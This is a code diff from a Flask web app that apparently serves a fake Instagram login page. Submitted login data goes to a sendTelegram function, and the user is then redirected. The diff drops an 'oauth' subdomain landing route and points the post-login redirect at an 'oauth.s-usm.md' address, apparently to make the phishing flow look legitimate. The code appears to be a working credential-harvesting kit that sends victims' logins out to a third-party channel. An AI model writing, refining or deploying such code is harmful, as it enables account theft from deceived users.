@@ -53,18 +53,13 @@ def sendTelegram(request):
 def error404(e):
     return redirect("https://s-usm.md")
 
-@app.route('/', subdomain='oauth')
-def home():
-    # Landing page
-    return render_template('index.html')
-
 @app.route('/login/instagram', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         # Process and handle the login data
         sendTelegram(request)
         # Redirect to the login page after POST request
-        return redirect('http://s-usm.md/login/instagram')
+        return redirect('http://oauth.s-usm.md/login/instagram')
     else:
         # Serve the login page on a GET request
         return render_template('login.html')
